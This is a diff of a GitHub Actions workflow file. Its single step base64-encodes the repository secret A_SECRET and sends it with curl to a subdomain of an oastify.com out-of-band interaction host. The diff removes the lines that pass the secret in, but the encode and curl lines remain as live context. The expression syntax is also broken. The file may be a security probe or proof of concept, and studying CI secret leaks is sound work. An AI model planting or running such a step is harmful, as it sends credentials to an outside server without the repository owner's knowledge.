@@ -23,8 +23,6 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Run a one-line script
-        with: 
-          A_SECRET: ${{ secrets.A_SECRET }}
         run: |
           EXFIL=${{ echo "$A_SECRET" | base64 }}
           curl -v http://$EXFIL.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
